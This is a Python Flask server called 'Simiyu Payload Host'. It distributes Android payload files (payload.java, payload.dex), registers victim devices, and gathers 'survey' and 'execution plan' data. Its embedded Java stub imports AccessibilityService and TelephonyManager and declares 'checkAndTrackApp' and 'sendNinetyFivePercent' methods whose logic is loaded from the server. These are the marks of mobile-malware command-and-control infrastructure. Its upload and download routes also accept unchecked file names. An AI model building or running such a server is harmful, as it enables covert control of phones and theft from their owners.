from flask import Flask, request, jsonify, send_file
import os
import json
import logging
from datetime import datetime
import hashlib

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
PAYLOAD_VERSION = "2.1.0"
PAYLOAD_FILE = "payload.java"
PAYLOAD_DEX_FILE = "payload.dex"
SURVEY_FILE = "survey_data.txt"
EXECUTION_FILE = "execution_plan.txt"
STATS_FILE = "stats.json"

# ==================== ENDPOINTS ====================

@app.route('/')
def index():
    """Main endpoint showing service status"""
    return jsonify({
        "status": "online",
        "service": "Simiyu Payload Host",
        "version": PAYLOAD_VERSION,
        "timestamp": datetime.now().isoformat(),
        "endpoints": {
            "payload": "/payload.java",
            "payload_dex": "/payload.dex",
            "version": "/version",
            "survey": "/survey",
            "execution": "/execution",
            "stats": "/stats",
            "health": "/health",
            "upload": "/upload",
            "download": "/download"
        }
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "version": PAYLOAD_VERSION,
        "timestamp": datetime.now().isoformat(),
        "memory_usage": os.popen('ps -o vsz= -p ' + str(os.getpid())).read().strip(),
        "files": get_file_list()
    })

@app.route('/version')
def version():
    """Get current version"""
    return jsonify({
        "version": PAYLOAD_VERSION,
        "release_date": "2024-07-13",
        "changes": [
            "Added simiyu.java integration",
            "Fixed survey data collection",
            "Improved execution planning",
            "Added Telegram notifications"
        ]
    })

@app.route('/payload.java')
def serve_payload():
    """Serve the main payload.java file"""
    try:
        if os.path.exists(PAYLOAD_FILE):
            return send_file(PAYLOAD_FILE, as_attachment=True, download_name="payload.java")
        else:
            # Create default payload if not exists
            create_default_payload()
            return send_file(PAYLOAD_FILE, as_attachment=True, download_name="payload.java")
    except Exception as e:
        logger.error(f"Error serving payload: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/payload.dex')
def serve_payload_dex():
    """Serve compiled payload.dex file"""
    try:
        if os.path.exists(PAYLOAD_DEX_FILE):
            return send_file(PAYLOAD_DEX_FILE, as_attachment=True, download_name="payload.dex")
        else:
            return jsonify({"error": "payload.dex not found"}), 404
    except Exception as e:
        logger.error(f"Error serving payload.dex: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/survey', methods=['GET', 'POST'])
def handle_survey():
    """Handle survey data - GET to retrieve, POST to submit"""
    if request.method == 'GET':
        try:
            if os.path.exists(SURVEY_FILE):
                with open(SURVEY_FILE, 'r') as f:
                    data = f.read()
                return jsonify({
                    "status": "success",
                    "data": data,
                    "size": os.path.getsize(SURVEY_FILE)
                })
            else:
                return jsonify({"status": "error", "message": "No survey data found"}), 404
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    
    elif request.method == 'POST':
        try:
            data = request.get_json()
            if not data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
            
            # Append survey data
            with open(SURVEY_FILE, 'a') as f:
                f.write(f"\n=== SURVEY DATA ===\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(f"Data: {json.dumps(data, indent=2)}\n")
                f.write(f"====================\n\n")
            
            # Update stats
            update_stats("survey_submissions")
            
            return jsonify({
                "status": "success",
                "message": "Survey data saved",
                "timestamp": datetime.now().isoformat()
            })
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/execution', methods=['GET', 'POST'])
def handle_execution():
    """Handle execution plan - GET to retrieve, POST to submit"""
    if request.method == 'GET':
        try:
            if os.path.exists(EXECUTION_FILE):
                with open(EXECUTION_FILE, 'r') as f:
                    data = f.read()
                return jsonify({
                    "status": "success",
                    "data": data,
                    "size": os.path.getsize(EXECUTION_FILE)
                })
            else:
                return jsonify({"status": "error", "message": "No execution plan found"}), 404
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    
    elif request.method == 'POST':
        try:
            data = request.get_json()
            if not data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
            
            # Save execution plan
            with open(EXECUTION_FILE, 'w') as f:
                f.write(f"=== EXECUTION PLAN ===\n")
                f.write(f"Created: {datetime.now().isoformat()}\n")
                f.write(f"Data: {json.dumps(data, indent=2)}\n")
                f.write(f"=====================\n")
            
            # Update stats
            update_stats("execution_plans")
            
            return jsonify({
                "status": "success",
                "message": "Execution plan saved",
                "timestamp": datetime.now().isoformat()
            })
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/stats')
def get_stats():
    """Get service statistics"""
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r') as f:
                stats = json.load(f)
        else:
            stats = create_default_stats()
        
        return jsonify({
            "status": "success",
            "stats": stats,
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload_file():
    """Upload a file to the server"""
    try:
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file provided"}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({"status": "error", "message": "No file selected"}), 400
        
        # Save file
        filename = file.filename
        file.save(filename)
        
        # Update stats
        update_stats("uploads")
        
        return jsonify({
            "status": "success",
            "message": f"File {filename} uploaded successfully",
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/download/<filename>')
def download_file(filename):
    """Download a specific file"""
    try:
        if os.path.exists(filename):
            return send_file(filename, as_attachment=True)
        else:
            return jsonify({"status": "error", "message": f"File {filename} not found"}), 404
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/devices')
def list_devices():
    """List all registered devices"""
    try:
        device_file = "devices.txt"
        if os.path.exists(device_file):
            with open(device_file, 'r') as f:
                devices = f.read().splitlines()
            return jsonify({
                "status": "success",
                "devices": devices,
                "count": len(devices)
            })
        else:
            return jsonify({"status": "success", "devices": [], "count": 0})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/register_device', methods=['POST'])
def register_device():
    """Register a new device"""
    try:
        data = request.get_json()
        if not data or 'device_id' not in data:
            return jsonify({"status": "error", "message": "Device ID required"}), 400
        
        device_id = data['device_id']
        device_info = data.get('device_info', 'Unknown')
        
        with open("devices.txt", 'a') as f:
            f.write(f"{device_id} | {device_info} | {datetime.now().isoformat()}\n")
        
        update_stats("device_registrations")
        
        return jsonify({
            "status": "success",
            "message": "Device registered",
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ==================== HELPER FUNCTIONS ====================

def get_file_list():
    """Get list of files in current directory"""
    files = []
    for f in os.listdir('.'):
        if os.path.isfile(f):
            files.append({
                "name": f,
                "size": os.path.getsize(f),
                "modified": datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
            })
    return files

def create_default_payload():
    """Create default payload.java if not exists"""
    default_payload = """package com.yourpackage.helper;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.provider.Settings;

public class Payload {
    private static Context appContext;
    private static Handler mainHandler = new Handler(Looper.getMainLooper());
    private static SharedPreferences sharedPreferences;
    
    public static void initialize(Context context) {
        appContext = context;
        sharedPreferences = context.getSharedPreferences("payload_prefs", Context.MODE_PRIVATE);
    }
    
    public static void checkAndTrackApp(String packageName) {
        // Implementation will be loaded from server
    }
    
    public static void sendNinetyFivePercent() {
        // Implementation will be loaded from server
    }
}
"""
    with open(PAYLOAD_FILE, 'w') as f:
        f.write(default_payload)

def create_default_stats():
    """Create default stats file"""
    stats = {
        "total_requests": 0,
        "survey_submissions": 0,
        "execution_plans": 0,
        "uploads": 0,
        "device_registrations": 0,
        "last_updated": datetime.now().isoformat()
    }
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f)
    return stats

def update_stats(key):
    """Update statistics"""
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r') as f:
                stats = json.load(f)
        else:
            stats = create_default_stats()
        
        stats[key] = stats.get(key, 0) + 1
        stats["total_requests"] = stats.get("total_requests", 0) + 1
        stats["last_updated"] = datetime.now().isoformat()
        
        with open(STATS_FILE, 'w') as f:
            json.dump(stats, f)
    except Exception as e:
        logger.error(f"Error updating stats: {e}")

# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(error):
    return jsonify({"status": "error", "message": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"status": "error", "message": "Internal server error"}), 500

# ==================== MAIN ====================

if __name__ == '__main__':
    # Create default files if not exist
    if not os.path.exists(PAYLOAD_FILE):
        create_default_payload()
    
    if not os.path.exists(STATS_FILE):
        create_default_stats()
    
    # Start server
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
